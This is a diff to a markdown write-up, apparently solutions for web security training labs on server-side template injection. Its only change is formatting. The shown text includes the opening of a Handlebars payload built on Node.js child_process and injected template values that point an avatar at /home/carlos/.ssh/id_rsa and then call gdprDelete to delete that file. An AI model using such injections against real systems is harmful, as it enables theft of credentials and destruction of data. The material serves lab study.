@@ -52,8 +52,8 @@ this lab is using a Handlebars template (Javascript).
 [link](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2).
 
 3. Using the Node.js [docs](https://nodejs.org/api/child_process.html) for child_process,
-we can craft the following payload: <br>
-    ```
+we can craft the following payload:
+    ```handlebars
     {{#with "s" as |string|}}
     {{#with "e"}}
         {{#with split as |conslist|}}
@@ -126,8 +126,8 @@ is a /home/carlos/User.php. <br>
 This payload makes it so that the avatar is the relevant php file, and a GET request to it
 allows us access to the file.
 
-4. We see there is a method called gdprDelete which happens to delete the avatar file. <br>
-    ```
+4. We see there is a method called gdprDelete which happens to delete the avatar file.
+    ```php
     blog-post-author-display=user.setAvatar("/home/carlos/.ssh/id_rsa","image/png")
     blog-post-author-display=user.gdprDelete()
     ```
